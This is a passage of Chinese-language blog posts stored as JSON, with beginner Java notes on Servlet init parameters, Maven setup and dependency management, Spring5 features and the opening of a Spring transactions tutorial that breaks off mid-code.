初始化参数\n\n初始化参数类似于初始化配置需要的一些值，比如我们的数据库连接相关信息，就可以通过初始化参数来给予Servlet，或是一些其他的配置项，也可以使用初始化参数来实现。\n\n我们可以给一个Servlet添加一些初始化参数：\n\n```java\n@WebServlet(value = \"/login\", initParams = {\n        @WebInitParam(name = \"test\", value = \"我是一个默认的初始化参数\")\n})\n```\n\n它也是以键值对形式保存的，我们可以直接通过Servlet的`getInitParameter`方法获取：\n\n```java\nSystem.out.println(getInitParameter(\"test\"));\n```\n\n但是，这里的初始化参数仅仅是针对于此Servlet，我们也可以定义全局初始化参数，只需要在web.xml编写即可：\n\n```xml\n<context-param>\n    <param-name>lbwnb</param-name>\n    <param-value>我是全局初始化参数</param-value>\n</context-param>\n```\n\n我们需要使用ServletContext来读取全局初始化参数：\n\n```java\nServletContext context = getServletContext();\nSystem.out.println(context.getInitParameter(\"lbwnb\"));\n```\n\n\n\n## 参考\n\n- [重温Servlet，2020年了，它还有必要学吗？](https://www.cnblogs.com/tanghaorong/p/12713000.html)\n- [Servlet教程 (biancheng.net)](http://c.biancheng.net/servlet2/)\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Servlet"],"categories":["JavaWeb"]},{"title":"Maven","url":"/posts/38008.html","content":"\n## Maven 简介\n\n> Maven 是 Apache 下的一个纯 Java 开发的项目管理和整合工具。它将项目的开发和管理过程抽象成一个项目对象模型（POM）。开发人员只需要做一些简单的配置，Maven 就可以自动完成项目的编译、测试、打包、发布以及部署等工作。\n\n通过Maven，可以帮助我们做：\n\n* 项目的自动构建，包括代码的编译、测试、打包、安装、部署等操作。\n* 依赖管理，项目使用到哪些依赖，可以快速完成导入。\n\n之前我们导入依赖的时候，每次都要去下载对应的 Jar 包，这样其实是很麻烦的，并且还有可能一个 Jar 包依赖于另一个 Jar 包，因此我们需要一个更加方便的包管理机制。\n\n## Maven安装\n\n### 下载 Maven\n\n- 安装前请确认 JDK 已安装完毕\n\n- 官网下载地址：[Maven – Download Apache Maven](https://maven.apache.org/download.cgi)\n\n- 下载 apache-maven-3.8.5-bin.zip，解压后移动到 `/opt`目录下\n\n###  **配置环境变量**\n\n配置 .bash\\_profile 环境变量，但是如果你安装了 iterm+zsh 就需要在 .zshrc 环境变量文件中配置\n\n```bash\n$ vim ~/.zshrc\n\n#注意将路径修改为你的maven文件路径\nexport MAVEN_HOME=/opt/maven/apache-maven-3.8.4 \nexport PATH=$PATH:$MAVEN_HOME/bin\n\n$ source ~/.zshrc #更新环境变量\n\n$ mvn -v  #测试maven\n```\n\n### Maven目录结构\n\n```bash\n$ tree -L 1\n.\n├── LICENSE\n├── NOTICE\n├── README.txt\n├── bin\n├── boot\n├── conf\n└── lib\n```\n\n- bin：该目录包含了 mvn 运行的脚本\n\n- boot：该目录只包含一个文件，该文件为plexus-classworlds-2.6.0.jar\n  - plexus-classworlds 是一个类加载器框架，相对于默认的 java 类加载器，它提供了更加丰富的语法以方便配置，Maven 使用该框架加载自己的类库。\n\n- conf：该目录包含了一个非常重要的文件 settings.xml\n  - 直接修改该文件，就能在机器上全局地定制 Maven的行为，一般情况下，我们可以直接复制该文件至`~/.m2/`目录下，然后修改该文件，在用户范围定制Maven的行为\n\n- lib：该目录包含了所有 Maven 运行时需要的Java类库和 Maven 用到的第三方依赖\n\n### 更换阿里镜像\n\n#### 全局配置\n\n打开`apache-maven-3.8.4/conf/setting.xml` 文件，大概在150行左右，找到`mirrors`，添加如下代码：\n\n```xml\n<mirror>\n    <id>nexus-aliyun</id>\n    <mirrorOf>central</mirrorOf>\n    <name>Nexus aliyun</name>\n    <url>http://maven.aliyun.com/nexus/content/groups/public</url>\n</mirror>\n```\n\n注：IDEA自带的Maven的配置文件在`/User/.m2/settings.xml` 位置下\n\n使用IDEA创建时，在偏好设置下的构建工具中进行修改Maven配置\n\n```\nMaven主路径：/opt/maven/apache-maven-3.8.4\n用户设置文件：/opt/maven/apache-maven-3.8.4/conf/settings.xml\n本地仓库：/opt/maven/repository\n```\n\n#### 单项目配置\n\n单项目配置时，需要修改pom文件。在pom文件中，通过覆盖默认的中央仓库的配置，实现中央仓库地址的变更。\n修改项目的pom文件：\n\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n    <groupId>com.test</groupId>\n    <artifactId>conifg</artifactId>\n    <packaging>war</packaging>\n    <version>0.0.1-SNAPSHOT</version>\n\n    <repositories>\n        <repository>\n            <id>central</id>\n            <name>aliyun maven</name>\n            <url>http://maven.aliyun.com/nexus/content/groups/public/</url>\n            <layout>default</layout>\n            <!-- 是否开启发布版构件下载 -->\n            <releases>\n                <enabled>true</enabled>\n            </releases>\n            <!-- 是否开启快照版构件下载 -->\n            <snapshots>\n                <enabled>false</enabled>\n            </snapshots>\n        </repository>\n    </repositories>\n\n</project>\n```\n\n## Maven项目结构\n\n我们可以来看一下，一个 Maven 项目和我们普通的项目有什么区别：\n\n![](https://img.jwt1399.top/img/src=http%253A%252F%252Fimg-blog.csdnimg.cn%252Fimg_convert%252F910235ebc812ba94abb0f762e3914f67.png&refer=http%253A%252F%252Fimg-blog.csdnimg.jpeg)\n\n```bash\n$ tree -L 3\n.\n├── pom.xml #配置文件\n├── src\n│   ├── main\n│   │   ├── java #Java源代码\n│   │   └── resources #资源文件\n│   └── test测试资源文件\n│       ├── java #Java源代码\n│       └── resources #测试资源文件\n└── target #项目输出位置，用于存放编译后的文件\n    ├── classes #编译输出文件\n    └── generated-sources\n```\n\n## Maven POM\n\nPOM文件，它相当于是我们整个Maven项目的配置文件，是使用XML编写的：\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.example</groupId>\n    <artifactId>MavenTest</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n</project>\n```\n\n我们可以看到，Maven的配置文件是以`project`为根节点，而`modelVersion`定义了当前模型的版本，一般是4.0.0，我们不用去修改。\n\n`groupId`、`artifactId`、`version`这三个元素合在一起，用于唯一区别每个项目，别人如果需要将我们编写的代码作为依赖，那么就必须通过这三个元素来定位我们的项目\n\n| 节点       | 描述                                                         |\n| ---------- | ------------------------------------------------------------ |\n| groupId    | 项目组 ID，定义当前 Maven 项目隶属的组织或公司，通常是唯一的。它的取值一般是项目所属公司或组织的网址或 URL 的反写，例如 net.biancheng.www。 |\n| artifactId | 项目 ID，通常是项目的名称。groupId 和 artifactId 一起定义了项目在仓库中的位置。 |\n| version    | 项目版本。                                                   |\n\n`properties`中一般都是一些变量和选项的配置，我们这里指定了JDK的源代码和编译版本为1.8，无需进行修改。\n\n## Maven依赖导入\n\n现在我们尝试使用Maven来帮助我们快速导入依赖，我们尝试导入 JUnit 依赖\n\n我们可以创建一个`dependencies`节点：\n\n```xml\n<dependencies>\n    //里面填写的就是所有的依赖\n</dependencies>\n```\n\n那么现在就可以向节点中填写依赖了，如何获取依赖的坐标呢？\n\n- 可以在：https://mvnrepository.com/ 进行查询\n\n- 直接搜索 JUnit 即可，选择合适的版本，依赖详情页的最下方就是该版本依赖的 Maven 坐标\n\n```xml\n<!-- https://mvnrepository.com/artifact/junit/junit -->\n<dependency>\n    <groupId>junit</groupId>\n    <artifactId>junit</artifactId>\n    <version>4.13.2</version>\n    <scope>test</scope>\n</dependency>\n```\n\n我们直接将其添加到`dependencies`节点中即可\n\n## Maven 仓库\n\n那么，Maven是如何进行依赖管理呢，以致于如此便捷的导入依赖，我们来看看Maven项目的依赖管理流程：\n\n![](https://img.jwt1399.top/img/src=http%253A%252F%252Fimage.bubuko.com%252Finfo%252F201901%252F20190106202802893827.png&refer=http%253A%252F%252Fimage.bubuko.jpeg)\n\n通过流程图我们得知\n\n- 一个项目依赖一般是存储在中央仓库中\n\n- 也有可能存储在一些其他的远程仓库（私服）\n\n几乎所有的依赖都被放到了中央仓库中，因此，Maven可以直接从中央仓库中下载大部分的依赖（Maven第一次导入依赖是需要联网的）\n\n远程仓库中下载之后 ，会暂时存储在本地仓库，我们会发现我们本地存在一个`.m2`文件夹，这就是Maven本地仓库文件夹，在下次导入依赖时，如果Maven发现本地仓库中就已经存在某个依赖，那么就不会再去远程仓库下载了。\n\n使用 IDEA 在导入依赖时，会出现卡顿的问题，建议配置一下IDEA自带的Maven插件远程仓库地址，我们打开IDEA的安装目录，找到`安装根目录/plugins/maven/lib/maven3/conf`文件夹，找到`settings.xml`文件，打开编辑，找到mirros标签，添加以下内容：\n\n```xml\n<mirror>\n      <id>nexus-aliyun</id>\n      <mirrorOf>*</mirrorOf>\n      <name>Nexus aliyun</name>\n      <url>http://maven.aliyun.com/nexus/content/groups/public</url>\n</mirror> \n```\n\n这样，我们就将默认的远程仓库地址（国外），配置为国内的阿里云仓库地址了，依赖的下载速度就会快起来了\n\n## Maven依赖作用域\n\n除了三个基本的属性用于定位坐标外，依赖还可以添加以下属性：\n\n- **type**：依赖的类型，对于项目坐标定义的packaging。大部分情况下，该元素不必声明，其默认值为jar\n- **scope**：依赖的范围（作用域，着重讲解）\n- **optional**：标记依赖是否可选\n- **exclusions**：用来排除传递性依赖（一个项目有可能依赖于其他项目，就像我们的项目，如果别人要用我们的项目作为依赖，那么就需要一起下载我们项目的依赖，如Lombok）\n\n我们着重来讲解一下`scope`属性，它决定了依赖的作用域范围：\n\n* **compile** ：**默认的依赖有效范围，在编译、运行、测试时均有效**。如果在定义依赖关系的时候，没有明确指定依赖有效范围的话，则默认采用该依赖有效范围。\n* **provided** ：**在编译、测试时有效**，但是在运行时无效，也就是说，项目在运行时，不需要此依赖，比如 Lombok，我们只需要在编译阶段使用它，编译完成后，实际上已经转换为对应的代码了，因此Lombok不需要在项目运行时也存在。\n* **runtime** ：**在运行、测试时有效**，但是在编译代码时无效。比如我们如果需要自己写一个JDBC实现，那么肯定要用到JDK为我们指定的接口，但是实际上在运行时是不用自带JDK的依赖，因此只保留我们自己写的内容即可。\n* **test** ：**只在测试时有效**，例如：JUnit，我们一般只会在测试阶段使用JUnit，而实际项目运行时，我们就用不到测试了，那么我们来看看，导入JUnit的依赖：\n\n同样的，我们可以在网站上搜索Junit的依赖，我们这里导入最新的JUnit5作为依赖：\n\n```xml\n<dependency>\n    <groupId>org.junit.jupiter</groupId>\n    <artifactId>junit-jupiter</artifactId>\n    <version>5.8.1</version>\n    <scope>test</scope>\n</dependency>\n```\n\n我们所有的测试用例全部编写到Maven项目给我们划分的test目录下，位于此目录下的内容不会在最后被打包到项目中，只用作开发阶段测试使用，因此，一般仅用作测试的依赖如JUnit只保留在测试中即可\n\n## Maven导入本地jar包\n\n实际的开发过程中，经常会遇到一种情况：某一个项目需要依赖于存储在本地的某个 jar 包，该 jar 包无法从任何仓库中下载的，这种依赖被称为外部依赖或本地依赖。那么这种依赖是如何声明的呢？\n\n可以使用第四种依赖作用域：\n\n* **system**：作用域和provided是一样的，但是它不是从远程仓库获取，而是直接导入本地Jar包：\n\n```xml\n<dependency>\n     <groupId>javax.jntm</groupId>\n     <artifactId>lbwnb</artifactId>\n     <version>2.0</version>\n     <!--依赖范围-->\n     <scope>system</scope>\n     <!--依赖所在位置-->\n     <systemPath>C://学习资料/4K高清无码/test.jar</systemPath>\n</dependency>\n```\n\n## Maven可选依赖\n\n当项目中的某些依赖的依赖不希望被使用时，我们可以给依赖添加`optional`标签表示此依赖是可选的，默认在导入依赖时，不会导入可选的依赖：\n\n```xml\n<optional>true</optional>\n```\n\n比如Mybatis的POM文件中，就存在大量的可选依赖：\n\n```xml\n<dependency>\n  <groupId>org.slf4j</groupId>\n  <artifactId>slf4j-api</artifactId>\n  <version>1.7.30</version>\n  <!--设置可选依赖  -->\n  <optional>true</optional>\n</dependency>\n<dependency>\n  <groupId>org.slf4j</groupId>\n  <artifactId>slf4j-log4j12</artifactId>\n  <version>1.7.30</version>\n  <!--设置可选依赖  -->\n  <optional>true</optional>\n</dependency>\n<dependency>\n  <groupId>log4j</groupId>\n  <artifactId>log4j</artifactId>\n  <version>1.2.17</version>\n  <!--设置可选依赖  -->\n  <optional>true</optional>\n</dependency>\n ...\n```\n\n由于Mybatis要支持多种类型的日志，需要用到很多种不同的日志框架，因此需要导入这些依赖来做兼容，但是我们项目中并不一定会使用这些日志框架作为Mybatis的日志打印器，因此这些日志框架仅Mybatis内部做兼容需要导入使用，而我们可以选择不使用这些框架或是选择其中一个即可，也就是说我们导入Mybatis之后想用什么日志框架再自己加就可以了。\n\n## Maven排除依赖\n\n如果存在那种不是可选依赖，但是我们导入此项目又不希望使用此依赖该怎么办呢，这个时候我们就可以通过排除依赖来防止添加不必要的依赖：\n\n```xml\n<dependency>\n    <groupId>org.junit.jupiter</groupId>\n    <artifactId>junit-jupiter</artifactId>\n    <version>5.8.1</version>\n    <scope>test</scope>\n  \n    <!--排除依赖  -->\n    <exclusions>\n        <exclusion>\n            <groupId>org.junit.jupiter</groupId>\n            <artifactId>junit-jupiter-engine</artifactId>\n        </exclusion>\n    </exclusions>\n  \n</dependency>\n```\n\n这里演示了排除JUnit的engine依赖，我们可以在外部库中观察排除依赖之后和之前的效果。\n\n## Maven继承关系\n\n一个Maven项目可以继承自另一个Maven项目，比如多个子项目都需要父项目的依赖，我们就可以使用继承关系来快速配置。\n\n我们右键左侧栏，新建一个模块，来创建一个子项目：\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <parent>\n        <artifactId>MavenTest</artifactId>\n        <groupId>org.example</groupId>\n        <version>1.0-SNAPSHOT</version>\n    </parent>\n    <modelVersion>4.0.0</modelVersion>\n\n    <artifactId>ChildModel</artifactId>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n</project>\n```\n\n我们可以看到，IDEA默认给我们添加了一个`parent节点`，表示此Maven项目是父Maven项目的子项目，子项目直接继承父项目的`groupId`，子项目会直接继承父项目的所有依赖，除非依赖添加了optional标签\n\n我们还可以让父Maven项目统一管理所有的依赖，包括版本号等，子项目可以选取需要的作为依赖，而版本全由父项目管理，我们可以将`dependencies`全部放入`dependencyManagement`节点，这样父项目就完全作为依赖统一管理。\n\n```xml\n<dependencyManagement>\n    <dependencies>\n        <dependency>\n            <groupId>org.junit.jupiter</groupId>\n            <artifactId>junit-jupiter</artifactId>\n            <version>5.8.1</version>\n            <scope>test</scope>\n        </dependency>\n        <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <version>8.0.27</version>\n        </dependency>\n    </dependencies>\n</dependencyManagement>\n```\n\n现在子项目不能直接继承父项目的依赖了，因为现在父项目将所有的依赖进行集中管理，子项目需要什么拿什么即可，同时子项目**无需指定版本**，**所有的版本全部由父项目决定**，子项目只需要使用即可：\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n        <scope>provided</scope>\n    </dependency>\n</dependencies>\n```\n\n当然，父项目如果还可以存在dependencies节点的话，里面的内依赖依然是直接继承\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.junit.jupiter</groupId>\n        <artifactId>junit-jupiter</artifactId>\n        <version>5.8.1</version>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n\n<dependencyManagement>\n    <dependencies>\n      ...\n```\n\n## Maven常用命令\n\n我们可以看到在IDEA右上角Maven板块中，每个Maven项目都有一个生命周期，实际上这些是Maven的一些插件，每个插件都有各自的功能，比如：\n\n* `clean`命令，执行后会清理整个`target`文件夹，在之后编写Springboot项目时可以解决一些缓存没更新的问题。\n* `validate`命令可以验证项目的可用性。\n* `compile`命令可以将项目编译为.class文件。\n* `install`命令可以将当前项目安装到本地仓库，以供其他项目导入作为依赖使用\n* `verify`命令可以按顺序执行每个默认生命周期阶段（`validate`，`compile`，`package`等）\n\n在IDEA Maven 工具窗口中，我们可以通过以下 3 种方式中执行 Maven 命令：\n\n- 1、使用 Run Anything 窗口\n  - 在 Maven 工具窗口的工具栏上，点击“m”按钮，或在 IntelliJ IDEA 中连续两次按下 Ctrl 键，即可打开 Run Anything 窗口\n- 2、使用 Maven 工具窗口的上下文菜单\n  -  在 Maven 工具窗口，点击项目名下面的 LifeCycle\n  - 右键单击 Maven 目标，在上下文菜单选择 Run '项目名 [Maven 目标]'（例如：Run 'secondEclipse [clean]'），即可执行该目标\n- 3、为一个或一组 Maven 目标创建运行配置。\n  - 在 Maven 工具窗口，点击项目名下面的 LifeCycle\n  - 按住 Ctrl/Command 键同时选择一个或多个 Maven 目标，然后单击鼠标右键，在下拉菜单中选择 Create Run Configuration... 或者 Modify Run Configuration... \n  - 在创建运行配置窗口，我们可以为 Maven 目标指定 Maven 命令和参数等，设置完成后，点击 OK 按钮保存该运行配置\n  - 配置完成后，在 Maven 工具窗口下自动生成了一个 Run Configurations 节点，在该节点下可以看到运行配置列表\n  - 在运行配置列表中，双击目标，或右键点击该目标然从上下文菜单中选择 Run，即可运行该目标。\n\n## Maven测试项目\n\n通过使用`test`命令，可以一键测试所有位于test目录下的测试案例，请注意有以下要求：\n\n* 测试类的名称必须是以`Test`结尾，比如`MainTest`\n* 测试方法上必须标注`@Test`注解，实测`@RepeatedTest`无效\n\n这是由于JUnit5比较新，我们需要重新配置插件升级到高版本，才能完美的兼容Junit5：\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-surefire-plugin</artifactId>\n            <!-- JUnit 5 requires Surefire version 2.22.0 or higher -->\n            <version>2.22.0</version>\n        </plugin>\n    </plugins>\n</build>\n```\n\n现在`@RepeatedTest`、`@BeforeAll`也能使用了。\n\n## Maven打包项目\n\n我们的项目在编写完成之后，要么作为Jar依赖，供其他模型使用，要么就作为一个可以执行的程序，在控制台运行，我们只需要直接执行`package`命令就可以直接对项目的代码进行打包，生成jar文件。\n\n当然，以上方式仅适用于作为Jar依赖的情况，如果我们需要打包一个可执行文件，那么我不仅需要将自己编写的类打包到Jar中，同时还需要将依赖也一并打包到Jar中，我们需要使用另一个插件来实现一起打包：\n\n```xml\n<plugin>\n    <artifactId>maven-assembly-plugin</artifactId>\n    <version>3.1.0</version>\n    <configuration>\n        <descriptorRefs>\n            <descriptorRef>jar-with-dependencies</descriptorRef>\n        </descriptorRefs>\n        <archive>\n            <manifest>\n                <addClasspath>true</addClasspath>\n                <mainClass>com.test.Main</mainClass>\n            </manifest>\n        </archive>\n    </configuration>\n    <executions>\n        <execution>\n            <id>make-assembly</id>\n            <phase>package</phase>\n            <goals>\n                <goal>single</goal>\n            </goals>\n        </execution>\n    </executions>\n</plugin>\n```\n\n在打包之前也会执行一次test命令，来保证项目能够正常运行，当测试出现问题时，打包将无法完成，我们也可以手动跳过，选择`执行Maven目标`来手动执行Maven命令，输入`mvn package -Dmaven.test.skip=true `来以跳过测试的方式进行打包。\n\n最后得到我们的Jar文件，在同级目录下输入`java -jar xxxx.jar`来运行我们打包好的Jar可执行程序（xxx代表文件名称）\n\n* `deploy`命令用于发布项目到本地仓库和远程仓库，一般情况下用不到。\n* `site`命令用于生成当前项目的发布站点，暂时不需要了解。\n\n多模块下父项目存在一个`packing`打包类型标签，所有的父级项目的packing都为pom，packing默认是jar类型，如果不作配置，maven会将该项目打成jar包。作为父级项目，还有一个重要的属性，那就是modules，通过modules标签将项目的所有子项目引用进来，在build父级项目时，会根据子模块的相互依赖关系整理一个build顺序，然后依次build。\n\n## 参考\n\n- [Maven教程](http://c.biancheng.net/maven2/profile.html)\n- [JavaWeb笔记（三）](https://blog.csdn.net/qq_25928447/article/details/121387814?spm=1001.2014.3001.5502)\n- [JavaWeb 教程 哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1CL4y1i7qR?p=51)（51p～55p）\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Maven"],"categories":["JavaWeb"]},{"title":"Spring5-新特性","url":"/posts/16410.html","content":"\n##  前言\n\n今天开始学习我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《Spring5-新特性》，小简从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计1天更新完\n- [x] 🎯开始时间：04-18\n- [x] 🎉结束时间：04-18\n- [x] 🍀总结：按时完成，但是完全记不住，自己写还得看文档！\n\n## Spring5 简介\n\n- Spring5 框架的代码基于**Java8**，运行时兼容 **JDK9**，许多不建议使用的类和方法在代码库中删除\n\n-  Spring5 框架自带了通用的日志封装 **Log4j2** \n  - Spring5 已经移除Log4jConfigListener，官方建议使用 Log4j2 \n  - Spring5 框架整合Log4j2 \n- Spring5 框架核心容器支持 **@Nullable** 注解 \n- Spring5 框架支持整合 **JUnit5** \n- Spring5 核心容器支持函数式风格 **GenericApplicationContext** \n- Spring5 框架新功能 **Webflux**\n\n## 通用的日志封装\n\n### 1、引入jar包\n\nLog4j2下载地址：[Download Apache Log4j 2](https://logging.apache.org/log4j/2.x/download.html)\n\nslf4j下载地址：[org/slf4j (maven.org)](https://repo1.maven.org/maven2/org/slf4j/)\n\n```java\nslf4j-api-1.7.36.jar\nlog4j-api-2.17.2.jar\nlog4j-core-2.17.2.jar\nlog4j-slf4j-impl-2.17.2.jar\n```\n\n### 2、创建log4j2.xml配置文件 \n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!--日志级别以及优先级排序: OFF > FATAL > ERROR > WARN > INFO > DEBUG > TRACE > ALL -->\n<!--Configuration 后面的 status 用于设置 log4j2 自身内部的信息输出，可以不设置，当设置成 trace 时，可以看到 log4j2 内部各种详细输出-->\n<configuration status=\"INFO\">\n    <!--先定义所有的 appender-->\n    <appenders>\n        <!--输出日志信息到控制台-->\n        <console name=\"Console\" target=\"SYSTEM_OUT\">\n            <!--控制日志输出的格式-->\n            <PatternLayout pattern=\"%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/>\n        </console>\n    </appenders>\n    <!--然后定义 logger，只有定义 logger 并引入的 appender，appender 才会生效-->\n    <!--root：用于指定项目的根日志，如果没有单独指定 Logger，则会使用 root 作为默认的日志输出-->\n    <loggers>\n        <root level=\"info\">\n            <appender-ref ref=\"Console\"/>\n        </root>\n    </loggers>\n</configuration>\n```\n\n## **@Nullable** 注解 \n\n@Nullable 注解可以使用在方法上面，属性上面，参数上面，表示方法返回可以为空，属性值可以为空，参数值可以为空\n\n- 注解用在方法上面，方法返回值可以为空\n\n```java\n@Nullable\nString getId()\n```\n\n- 注解使用在方法参数里面，方法参数可以为空 \n\n```java\npublic ClassPathXmlApplicationContext(String[] configLocations, @Nullable ApplicationContext parent) throws BeansException {\n  this(configLocations, true, parent);\n}\n```\n\n- 注解使用在属性上面，属性值可以为空 \n\n```java\n@Nullable\nprivate Resource[] configResources;\n```\n\n## 函数式注册对象\n\n```java\n// 函数式风格创建对象，交给Spring进行管理\n@Test\npublic void testGenericApplicationContext() {\n    //1 创建 GenericApplicationContext 对象\n    GenericApplicationContext context = new GenericApplicationContext();\n    //2 调用 context 的方法对象注册\n    // refresh把内容清空进行注册\n    context.refresh();\n\n    context.registerBean(User.class, () -> new User());\n    context.registerBean(\"user1\", User.class, () -> new User());\n\n    // 获取在Spring里注册的对象\n    Object user = context.getBean(\"com.jwt.aop.User\");\n    Object user1 = context.getBean(\"user1\");\n    System.out.println(user);\n    System.out.println(user1);\n}\n\n/**\ncom.jwt.aop.User@3712b94\ncom.jwt.aop.User@2833cc44\n**/\n```\n\n## 支持JUnit 5\n\n### JUnit4\n\n1、引入依赖\n\n```java\nhamcrest-core-1.3.jar  //JUnit4\njunit-4.12.jar //JUnit4\nspring-test-5.3.18.jar //单元测试注解\n```\n\n2、创建测试类，使用注解方式实现\n\n```java\n@RunWith(SpringJUnit4ClassRunner.class) //单元测试框架\n@ContextConfiguration(\"classpath:jdbc.xml\") //加载配置文件\npublic class JTest4 {\n    @Autowired \n    private UserService userService;\n    @Test\n    public void test() {\n        userService.accountMoney();\n    }\n}\n```\n\n可以代替下面的测试方法，简化代码\n\n```java\n@Test\npublic void testTransaction() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  userService.accountMoney();\n}\n```\n\n### JUnit5\n\n1、引入JUnit5的jar包 \n\n2、创建测试类，使用注解方式实现\n\n```java\n@ExtendWith(SpringExtension.class)\n@ContextConfiguration(\"classpath:jdbc.xml\")\npublic class JTest5 {\n    @Autowired\n    private UserService userService;\n    @Test\n    public void testJunit5() {\n        userService.add();\n    }\n}\n```\n\n使用一个复合注解替代上面两个注解完成整合\n\n```java\n@SpringJUnitConfig(locations = \"classpath:jdbc.xml\")\npublic class JTest5 {\n    @Autowired\n    private UserService userService;\n    @Test\n    public void testJunit5() {\n        userService.add();\n    }\n}\n```\n\n## Webflux\n\n学完 SpringMVC 再学\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"Spring-事务","url":"/posts/24314.html","content":"\n##  前言\n\n今天开始学习我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《Spring-事务》，小简从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计1天更新完\n- [x] 🎯开始时间：04-17\n- [x] 🎉结束时间：04-17\n- [x] 🍀总结：使用很简单，一天搞定，源码部分后面再看\n\n## 事物概念\n\n- 事务是数据库操作最基本单元，逻辑上一组操作，要么都成功，如果有一个失败所有操作都失败\n- 典型场景：银行转账\n  - 小明转账100元给小红\n  - 小明少100，小红多100 \n\n- 事务四个特性(ACID)\n  - 原子性：操作不可分割，要么都成功要么都失败\n  - 一致性：操作之前和操作之后的总量不变\n  - 隔离性：多事务操作，各个事务之间不会产生影响\n  - 持久性：事务提交，表中数据发生变化\n\n## 引出事务\n\n- Dao——数据库操作\n  - 少钱方法\n  - 多钱方法\n\n- Service——业务操作\n  - 调用Dao的两个方法\n\n1、创建数据表，添加记录\n\n```sql\nid\tname\tmoney\n1\t 小明\t 1000\n2\t 小红\t 1000\n```\n\n2、创建 service，搭建 dao，完成对象创建和注入关系\n\n```java\n//在 dao 注入 JdbcTemplate，service 注入 dao\npublic interface UserDao{\n  \n}\n\n@Repository\npublic class UserDaoImpl implements UserDao {\n   //注入 JdbcTemplate\n   @Autowired\n   private JdbcTemplate jdbcTemplate;\n}\n\n@Service\npublic class UserService {\n   //注入 dao\n   @Autowired\n   private UserDao userDao;\n}\n```\n\n3、在 dao 创建两个方法：多钱和少钱的方法， 在 service 创建转账的方法\n\n```java\npublic interface UserDao{\n  void reduceMoney();\n  void addMoney(); \n}\n\n@Repository\npublic class UserDaoImpl implements UserDao {\n   @Autowired\n   private JdbcTemplate jdbcTemplate;\n   //少钱\n   @Override\n   public void reduceMoney() {\n       String sql = \"update account set money=money-? where username=?\";\n       jdbcTemplate.update(sql,100,\"小明\");\n   